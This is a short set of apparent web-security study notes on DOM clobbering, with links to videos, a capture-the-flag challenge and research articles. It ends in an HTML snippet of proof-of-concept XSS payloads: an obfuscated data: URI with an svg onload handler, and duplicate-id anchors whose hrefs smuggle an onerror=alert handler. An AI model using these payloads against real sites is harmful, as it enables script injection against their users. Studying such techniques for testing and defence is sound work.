---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DOM clobbering

DOM clobbering is a **technique in which HTML is injected into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page**

So you can clobber a global variable or property of an object and overwrite it with DOM Node or HTML collection.

[https://www.youtube.com/watch?v=eWD4LH5W2Es](https://www.youtube.com/watch?v=eWD4LH5W2Es)\
[https://www.youtube.com/watch?v=7eZnQgluz1Q\&list=PLWvfB8dRFqba4RedkuUDWMEkAkP8cdZCW](https://www.youtube.com/watch?v=7eZnQgluz1Q\&list=PLWvfB8dRFqba4RedkuUDWMEkAkP8cdZCW)\
[https://www.youtube.com/watch?v=vgBAUvPJnT8](https://www.youtube.com/watch?v=vgBAUvPJnT8)\
[https://www.youtube.com/watch?v=sqlI-Tm-Bpg](https://www.youtube.com/watch?v=sqlI-Tm-Bpg)\
[https://bugology.intigriti.io/intigriti-monthly-challenges/0124](https://bugology.intigriti.io/intigriti-monthly-challenges/0124)\
[https://challenge-0124.intigriti.io/](https://challenge-0124.intigriti.io/)\
[https://github.com/SoheilKhodayari/TheThing](https://github.com/SoheilKhodayari/TheThing)\
[https://domclob.xyz/domc\_wiki/techniques/windowNamedAccess.html](https://domclob.xyz/domc\_wiki/techniques/windowNamedAccess.html)\
[https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\
[https://research.securitum.com/xss-in-amp4email-dom-clobbering/](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)

<pre class="language-html"><code class="lang-html"><strong>&#x3C;li>&#x3C;a href="https://example.com">Website&#x3C;/a>&#x3C;/li>
</strong>&#x3C;li>&#x3C;a href="mailto:m.bluth@example.com">Email&#x3C;/a>&#x3C;/li>
&#x3C;li>&#x3C;a href="tel:+123456789">Phone&#x3C;/a>&#x3C;/li>  
&#x3C;li>&#x3C;a href="cid:image-ref">Phone&#x3C;/a>&#x3C;/li>  
&#x3C;math>&#x3C;a xlink:href="//jsfiddle.net/t846h/">click
&#x3C;a href="data:text/html;base64_,&#x3C;svg/onload=\u0061&#x26;#x6C;&#x26;#101%72t(1)>">X&#x3C;/a

//Check how href behave on different attributes

&#x3C;a id="defaultAvatar">&#x3C;a id="defaultAvatar" href="tel:asdf&#x26;quot;onerror=alert(123)//" name="avatar">
&#x3C;a id="defaultAvatar">&#x3C;a id="defaultAvatar" href="cid:asdf&#x26;quot;onerror=alert(123)//" name="avatar">

</code></pre>

[https://portswigger.net/web-security/dom-based](https://portswigger.net/web-security/dom-based)\
